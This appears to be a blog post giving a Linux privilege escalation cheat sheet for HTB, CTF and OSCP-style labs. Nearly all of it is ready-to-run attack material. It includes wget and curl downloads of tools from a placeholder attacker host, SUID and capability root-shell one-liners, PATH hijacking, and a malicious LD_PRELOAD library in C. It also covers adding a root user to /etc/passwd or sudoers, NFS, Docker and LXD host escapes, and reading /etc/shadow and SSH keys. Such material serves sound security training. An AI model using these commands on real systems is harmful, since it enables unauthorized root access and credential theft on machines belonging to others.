---
layout: post
title: "Linux Privilege Escalation Cheatsheet"
subtitle: "Fast techniques, tools, and commands for HTB, CTFs and OSCP-like environments"
tags: [linux, privesc, escalation, cheatsheet, hacking, htb, ctf]
---

A practical cheat sheet for quick Linux privilege escalation during HTB, CTFs and offensive security labs.

---

# 0. ESSENTIAL PRIVESC RESOURCES & TOOLS

Before manually enumerating the system, these tools provide fast, high-value information.

## 📌 PrivEsc Tools & Frameworks
- **LinPEAS**: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS  
- **LinEnum**: https://github.com/rebootuser/LinEnum  
- **Linux Smart Enumeration (LSE)**: https://github.com/diego-treitos/linux-smart-enumeration  
- **pspy (Process watcher)**: https://github.com/DominicBreuker/pspy  
- **GTFOBins (SUID/SGID exploits)**: https://gtfobins.github.io/  
- **PayloadsAllTheThings – Linux PrivEsc**: https://github.com/swisskyrepo/PayloadsAllTheThings  

---

# 0.1 QUICK FILE TRANSFER COMMANDS (upload tools to target)

## Attacker: Host files
```

python3 -m http.server 8000

```

## Victim: Download enumeration tools
```

wget http://ATTACKER_IP:8000/linpeas.sh
curl -O http://ATTACKER_IP:8000/linpeas.sh

wget http://ATTACKER_IP:8000/pspy64
curl -O http://ATTACKER_IP:8000/pspy64

wget http://ATTACKER_IP:8000/LinEnum.sh
curl -O http://ATTACKER_IP:8000/LinEnum.sh

```

---

# 1. BASIC SYSTEM ENUMERATION

## System Info
```

uname -a
cat /etc/issue
cat /etc/os-release

```

## Users & Groups
```

id
whoami
cat /etc/passwd
groups

```

## Current Permissions
```

sudo -l
umask

```

## Kernel & Platform
```

hostnamectl
lsb_release -a

```

---

# 2. SUID / SGID PRIVILEGE ESCALATION

## Find SUID binaries
```

find / -perm -4000 -type f 2>/dev/null

```

## Find SGID binaries
```

find / -perm -2000 -type f 2>/dev/null

```

## Common SUID binaries to exploit (GTFOBins)
- `find`
- `bash`
- `vim`
- `less` / `more`
- `python` / `perl`
- `cp` / `tar` / `zip`
- `env`
- `nmap`

## Example: SUID bash
```

./bash -p

```

## Example: SUID Python
```

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```

---

# 3. CAPABILITIES-BASED ESCALATION

## List all capabilities
```

getcap -r / 2>/dev/null

```

### Dangerous capabilities
- `cap_setuid+ep`
- `cap_setgid+ep`
- `cap_dac_read_search+ep`
- `cap_dac_override+ep`

### Example: Python with cap_setuid
```

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```

---

# 4. SERVICES & SOFTWARE MISCONFIGURATIONS

## Running processes
```

ps aux | grep -i root

```

## Listening ports
```

ss -tunlp

```

## Cron jobs
```

cat /etc/crontab
ls -la /etc/cron.*

```

Writable scripts → modify → wait for root cron execution.

## Systemd service abuses
```

systemctl list-units --type=service
systemctl cat <service>

```

Check for writable unit files or executable paths.

---

# 5. PATH HIJACKING

If a root script calls binaries without full path:

Vulnerable example:
```

backup.sh:
#!/bin/bash
cp file1 file2

```

Hijack:
```

echo "/bin/bash" > /tmp/cp
chmod +x /tmp/cp
export PATH=/tmp:$PATH

```

Trigger script → spawns root shell.

---

# 6. ENVIRONMENT VARIABLE HIJACKING

If `LD_PRELOAD` is allowed:

Malicious library:
```c
#include <stdio.h>
#include <stdlib.h>
static void _init() {
    setuid(0);
    system("/bin/bash");
}
```

Compile:

```
gcc -fPIC -shared -o /tmp/lib.so exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/lib.so any_binary
```

---

# 7. WRITABLE SYSTEM FILES

## Writeable sudoers

```
ls -la /etc/sudoers
```

Add:

```
user ALL=(ALL) NOPASSWD:ALL
```

## Writeable /etc/passwd

```
openssl passwd -1 hacker
```

Insert:

```
hacker:<hash>:0:0:root:/root:/bin/bash
```

---

# 8. NFS PRIVILEGE ESCALATION

If export has `no_root_squash`:

Attacker:

```
mount -t nfs TARGET:/share /mnt/nfs
```

Create SUID shell:

```
cp /bin/bash /mnt/nfs/shell
chmod +s /mnt/nfs/shell
```

Victim:

```
./shell -p
```

---

# 9. PASSWORD & CREDENTIAL HUNTING

## Search for passwords

```
grep -Ri "password" / 2>/dev/null
grep -Ri "pass" /home
```

## SSH keys

```
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
```

## Sensitive configs

```
cat /etc/shadow
cat /root/.bash_history
```

---

# 10. DOCKER / LXD ESCALATION

## Docker escape

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## LXD escape

```
lxd init --auto
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc rootfs disk source=/ path=/mnt/root/
lxc start privesc
lxc exec privesc sh
```

---

# 11. KERNEL EXPLOITS (LAST RESORT)

Check kernel:

```
uname -r
```

Exploit families to check:

* DirtyCow
* OverlayFS
* DirtyPipe
* perf_swevent
* Mempodipper
* DirtyCred

Be careful: may crash the system.

---

# 12. AUTOMATED ENUMERATION

## LinPEAS

```
chmod +x linpeas.sh
./linpeas.sh
```

## LinEnum

```
chmod +x LinEnum.sh
./LinEnum.sh
```

## pspy 
```
./pspy64
```

---

# Final Notes

This cheat sheet centralizes the most common and effective Linux privilege escalation techniques:

* SUID / SGID abuses
* Capabilities
* Cron/service misconfigurations
* Path & environment hijacking
* Writable system files
* NFS, Docker & LXD
* Credential hunting
* Kernel exploits
* Automated enumeration tools

Suitable for HTB, CTFs, OSCP prep, and controlled pentest labs.

---